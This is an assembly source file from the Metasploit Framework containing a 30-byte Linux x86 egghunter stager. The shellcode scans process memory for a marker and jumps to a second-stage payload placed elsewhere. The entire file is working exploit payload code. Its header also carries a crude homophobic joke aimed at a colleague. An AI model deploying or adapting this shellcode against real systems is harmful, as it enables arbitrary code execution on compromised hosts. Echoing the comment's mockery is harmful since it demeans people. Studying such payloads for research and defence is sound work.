;;
; 
;        Name: stager_egghunt
;        Size: 30 bytes
;        Type: Stager
;   Qualities: None
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision$
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Linux egghunt implementation that searches a process'
;        address space for a second stage that is somewhere else
;        in memory.  spoonm doesn't think this is technically a 
;        stager, but then again he also starred in that gay porno
;        back in the 70's.
;
;;
BITS   32
GLOBAL _start

_start:

loop_inc_page:
	or   cx, 0x0fff
loop_inc_one:
	inc  ecx
loop_check:
	push byte 0x43
	pop  eax
	int  0x80
	cmp  al, 0xf2
	je   loop_inc_page

is_egg:
	mov  eax, 0x50905090
	mov  edi, ecx
	scasd
	jnz  loop_inc_one
	scasd
	jnz  loop_inc_one
	jmp  edi
